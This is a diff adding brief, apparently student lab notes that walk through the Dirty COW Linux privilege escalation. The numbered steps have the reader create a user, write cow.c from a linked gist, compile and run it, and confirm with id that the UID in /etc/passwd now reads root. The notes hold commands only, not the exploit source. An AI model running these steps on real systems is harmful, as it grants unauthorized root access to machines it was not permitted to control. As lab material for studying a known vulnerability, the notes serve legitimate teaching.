@@ -1,0 +1,24 @@
+This attack includes over-writing a user's UID in /etc/passwd to gain root privileges.
+
+
+1)sudo -s //Login into root
+
+2)adduser unikl //Create a new user in the root directory
+
+3)cat /etc/passwd //Check the user that we made
+
+4)su unikl //log in as user 
+
+5)Id // check the uid on unikl
+
+6)nano cow.c //To creat dirtycow exploit file
+
+7)use the github commands : https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679
+
+8)gcc -pthread cow.c -o cow  // To copmile
+
+9)./cow // To run exploit
+
+10)Id  // Checking uid once more reveals that the value of id has been changed to root privilege
+
+
